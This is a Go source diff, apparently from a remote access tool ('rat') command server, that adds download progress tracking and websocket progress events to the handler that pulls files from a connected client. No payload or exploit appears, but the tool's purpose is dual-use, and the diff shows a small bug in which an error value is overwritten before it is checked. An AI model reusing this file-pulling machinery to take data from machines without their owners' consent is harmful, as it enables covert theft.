@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"io"
 	"os"
 	"rat/command/utils"
@@ -14,9 +15,11 @@ import (
 type Transfer struct {
 	Local  *os.File
 	Remote string
+	Read   int64
+	Total  int64
 }
 
-type TransfersMap map[string]Transfer
+type TransfersMap map[string]*Transfer
 
 var Transfers TransfersMap
 
@@ -38,7 +41,7 @@ func (packet DownloadPacket) Write(c *Client) error {
 
 func (packet DownloadPacket) Read(c *Client) error {
 	file, err := c.ReadString()
-
+	total, err := c.ReadInt64()
 	if err != nil {
 		return err
 	}
@@ -50,10 +53,25 @@ func (packet DownloadPacket) Read(c *Client) error {
 	io.ReadFull(c.Conn, b)
 
 	transfer := Transfers[file]
+	transfer.Total = total
+	transfer.Read += int64(len)
 	_, err = transfer.Local.Write(b)
 
 	if err != nil {
 		return err
+	}
+
+	if ws, ok := c.Listeners[common.GetFileHeader]; ok {
+		e := DownloadProgressEvent{file, transfer.Read, transfer.Total}
+
+		data, err := json.Marshal(&e)
+		event := newEvent(DownloadProgressUpdateEvent, c.Id, string(data))
+
+		err = websocket.JSON.Send(ws, &event)
+
+		if err != nil {
+			return err
+		}
 	}
 
 	if final {
